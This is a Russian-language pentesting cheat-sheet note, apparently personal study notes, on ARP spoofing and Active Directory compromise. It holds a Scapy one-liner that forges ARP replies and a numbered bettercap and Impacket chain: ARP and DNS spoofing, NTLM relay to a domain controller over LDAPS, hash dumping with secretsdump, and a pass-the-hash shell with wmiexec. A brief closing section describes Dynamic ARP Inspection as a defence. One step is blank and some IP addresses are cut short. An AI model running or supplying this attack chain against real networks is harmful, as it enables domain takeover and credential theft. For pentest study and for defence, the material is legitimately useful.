#attacks #network #protocol #spoofing #arp #mitm
## 1) Подмена ARP таблицы

`arp -a` - Проверить ARP кэш
`arp -d` - Отчистить ARP кэш

Необходимо отправить ответы, что якобы мы являемся тем-то тем-то и наш MAC адрес такой-то (Выдать себя за другого). В Этом поможет Scapy

- from scapy.all import *
- sendp(Ether(dst='92:94:88:A8:EE:94')/ARP(op='is-at', psrc='192.168.0.1', hwsrc='ea:f0:2f:00:11:3a'))

## 2) Компрометация домена AD

1) sudo bettercap -iface eth0 
	Включить bettercap на данном интерфейсе
2) net.probe on
	Осуществление Arp сканирования
3) net.probe off
	Отключение Arp сканирования
4) net.show
	Просмотр обнаруженных хостов/потенциальных жертв 
5) set arp.spoof.fullduplex true
	Включение полного дуплекса для перехвата ответного трафика
6) set arp.spoof.targets 192.168.0.
	Говорим кого атакуем
7) set dns.spoof.domains *
	Говорим, что во всех DNS ответах спуфим все домены
8) set dns.spoof.address 192.168.0.
	 И все DNS ответы спуфим на IP атакующего
9)  
	Включаем DNS spoofing
10) arp.spoof on
	Включаем ARP spoofing
11) sudo ntlmrelayx.py -6 -smb2support -l loot.d -of loot.txt -t ldaps://192.168.0.100 (Ip контроллера домена) --no-dump
12) secretsdump.py newlogin@192.168.0.100  ...    newpass
	 Извлечение хэшей при помощи новой учетной записи с правами админа
13) wmiexec.py -hashes :NTLMхэш  administrator@192.168.0.100
	Получаем сессию контроллера домена

## Защита от атаки ARP-Spoofing
> **Dynamic ARP inspection**

Коммутатор настраивается:
1) Распределяются порты на доверенные и недоверенные
2) Доверенные - uplink или соединения с другими коммутаторами
3) Недоверенные - порты к конечным устройствам
4) Анализируются только ARP пакеты с недоверенных портов
5) Сопоставляются IP/MAC согласно DHCP Snooping Binding Table (Создается при включении коммутатора) 